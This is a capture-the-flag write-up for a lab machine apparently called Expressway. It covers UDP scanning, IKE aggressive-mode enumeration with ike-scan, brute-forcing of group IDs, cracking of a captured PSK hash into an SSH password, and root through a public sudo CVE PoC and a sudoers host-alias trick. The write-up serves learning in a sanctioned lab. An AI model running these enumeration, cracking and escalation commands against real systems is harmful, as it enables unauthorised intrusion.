---
tags:
  - Linux
  - Easy
  - UDP
  - IKE
  - isakmp
  - ike-scan
  - sudo
---
![banner.png](Images/banner.png)

## User

As always, we first start off with an nmap scan. This machine, at first glance, had only one port open: SSH.

```# Nmap 7.95 scan initiated Sun Sep 21 02:01:46 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -vv -oA nmap/expressway 10.129.174.238
Nmap scan report for 10.129.174.238
Host is up, received echo-reply ttl 63 (0.052s latency).
Scanned at 2025-09-21 02:01:46 GMT for 4s
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 21 02:01:50 2025 -- 1 IP address (1 host up) scanned in 4.23 seconds
```

After some preliminary research, it was evident that there wasn't a path forward with just SSH. With no where else to go, I also performed a UDP scan with some more promising results:

```# Nmap 7.95 scan initiated Sun Sep 21 02:04:21 2025 as: /usr/lib/nmap/nmap --privileged -sU -o nmap/nmapUDP 10.129.174.238
Nmap scan report for 10.129.174.238
Host is up (0.10s latency).
Not shown: 996 closed udp ports (port-unreach)
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike

# Nmap done at Sun Sep 21 02:22:58 2025 -- 1 IP address (1 host up) scanned in 1117.46 seconds
```

The filtered ports didn't seem helpful, however `isakmp` seemed promising.

### IKE

After doing some research into `isakmp`, I found [this article](https://burmat.gitbook.io/security/hacking/tools-and-services/ike-scan) which showed some ways to begin testing the port using `ike-scan`. Before following the steps in the article, I first made sure that I could actually interact with the port. To do this, I used the command:
`ike-scan -M -A <IP>`
This returned the following results:

```Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.238.52   Aggressive Mode Handshake returned
        HDR=(CKY-R=0b90ab6c58839203)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.259 seconds (3.86 hosts/sec).  1 returned handshake; 0 returned notify
```

I took notice that Auth=PSK which was a requirement for getting a hash. I also noticed the `Value=ike@expressway.htb` which appeared to show a future valid username. With this in hand, I began looking at the helpful article.

Following the article, I used the following command to brute force some group IDs:
`while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < ~/git/Seclists/Miscellaneous/ike-groupid.txt`
One of the output (there were multiple) group IDs included "outside", so I treated that as my ID. I then was able to get the hash by using:
`sudo ike-scan -A 10.129.174.238 -P -id=outside > psk_hash.txt`
Aside from some other details put into the `psk_hash.txt` file, it also included a hash.

```Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.174.238  Aggressive Mode Handshake returned HDR=(CKY-R=a29bb552d0a7926a) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
2a28b1f4b44e1a0b9ec9eb10f991cb4693424b0bb6462b5a76d3b67e575008f8bd733a90013efd713fa83921d62b8285d11f9bc40e0723c4d9fc8f0c505ec5c72d6478d137b4ba226864253029b805bf79d8cddf20b9eede13fb0b067f67ff7ce7eba21c726c3133d2450e8d36cecebaf5b823db3190609746796009ab9c7625:51727040f8564f975c074f845cb138e08b6ea61375a2d7891fd82dad0013b50384c8b84d8c88bf25a904e8be8bf3b2044edb932e50decf52db00e2b95fa6a1a5ea2044ebdbd7655e28914a471abeb007353bdb496c86ac54854af6c3ec30d54a9cc493fb770b890778620971832bf618b60d86ed0e8a07e1744f5f7f2b2adb45:a29bb552d0a7926a:ce6e1fbfb9b3135a:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:a59f590ada3c4f4d799dadd9bf0a8128456aac81:87102d81b8ee26292df8414a0c033c34ad059cb29915205991c0629c0465dad4:ca0932b93f78b742a278e731f4def3eaff53e0d6
Ending ike-scan 1.9.6: 1 hosts scanned in 0.059 seconds (16.81 hosts/sec).  1 returned handshake; 0 returned notify
```

I stored the hash (`2a28b...0d6`) in a file called `ike.hash` and cracked it with the following hashcat command:
`hashcat -a 0 -m 5400 ike.hash~/Documents/rockyou.txt`
This yielded a password of `freakingrockstarontheroad` which I could then use to log in to the box with ssh: `ssh ike@expressway.htb` (modifying /etc/hosts to include the IP and host). Inside ike's home directory was the `user.txt` flag.

## Root

After getting user, there ended up being quite a few red herrings:

- The other UDP ports, which I discovered all ended up having to do with QOTD or `isakmp`, so was a dead end.
- There was port 25 open for SMTP. This had Exim running on version 4.98.2 (discovered by using `nc localhost 25`) which was not vulnerable to any online exploits, or have any way to get useful information.
- There were some processes regarding dhclient, tftp, exim, etc. which were not useful.
After a small nudge, apparently `sudo` had a vulnerable version. Some people had `linpeas.sh` flag it, but mine didn't mark it that well.
![sudo version.png](Images/sudo%20version.png)
With some brief research, it appeared that this version of sudo was subject to `CVE-2025-32463` which basically gives insta-root. I looked up a GitHub poc and found one for it here: <https://github.com/MohamedKarrab/CVE-2025-32463>
From there, I cloned the repo and used `scp` to move it to the box. I executed their Python script for the exploit and popped a root shell.
![root poc.png](Images/root%20poc.png)

## Post-Root

There apparently was another way to root the machine using the following command:
`sudo -h offramp.expressway.htb -i`
This also immediately pops a root shell. This is because of how `/etc/sudoers` is defined which can be read with root permissions:

```# Host alias specification
Host_Alias     SERVERS        = expressway.htb, offramp.expressway.htb
Host_Alias     PROD           = expressway.htb
ike            SERVERS, !PROD = NOPASSWD:ALL
ike         offramp.expressway.htb  = NOPASSWD:ALL
```

I'm not sure how we're supposed to know that this exists in the sudoers file, but it just works. The only mention of `offramp.expressway.htb` is in `/var/log/squid/access.log.1` which ike *can* read, but makes no reference to sudo or anything. In any case, it is another method to get root.
